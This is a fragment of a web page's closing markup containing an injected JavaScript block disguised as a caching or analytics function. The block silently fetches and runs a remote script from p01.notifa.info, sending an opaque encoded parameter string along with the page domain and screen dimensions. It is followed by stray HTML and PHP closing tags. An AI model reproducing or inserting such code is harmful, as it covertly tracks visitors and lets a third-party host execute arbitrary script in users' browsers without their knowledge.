<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mT4iv9akMP2na6Mtk8Li2JQpaoraWLtTEqmX7IxGrM0mPoDprPQD9BqzV0uVByOzmE1sBJzyVSQd5tpUniuvykLctokZ0u33HCas28AGHGB%2fDeTQ0jcKuRRXn%2fwVQEeeFE1t2z%2bJEPVjEVE7eNgF3UkGh9xtRnjIvWPqCtjtm%2faPpzustpqvrJJdoF%2bEb%2fgCLqYML4Pg1Tb9r2Z5MViUQZ3m00C5irRLsgJoFRPMhsocsOuD9PbxcKOvHqQJVCm3tIDyuM3lp%2bh%2f00OJUiNPCfCsef6QpNB%2bfHW1kgXexFbfIiFNNRjGlSn%2fIRlwcDPt9%2b1SyCJTqv%2b4QoEsEsFCSuKKh%2bh1xeTBKvim%2bWZMaN9GVBLTCxEjAK8XnQX28Ze5eB3i63C2DHODj0U1l332XQXdulrAE96vOoLNOtayh4wtbUdI3t2KAui%2bYHasWBOBpI1URXJUYk%2b11MeVaBI1Zrw8CVDzvT7MlIzbX%2bLuYuwo3K0CL19%2bgve7aCZSk1uzl6SJvAtbnBmkI%2buSC8%2bl2Ea0hO08y2Asux5Hw5qsEa%2fmFmhCINISD39qO3Ik6b5%2bU" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
<?php  
}
?>
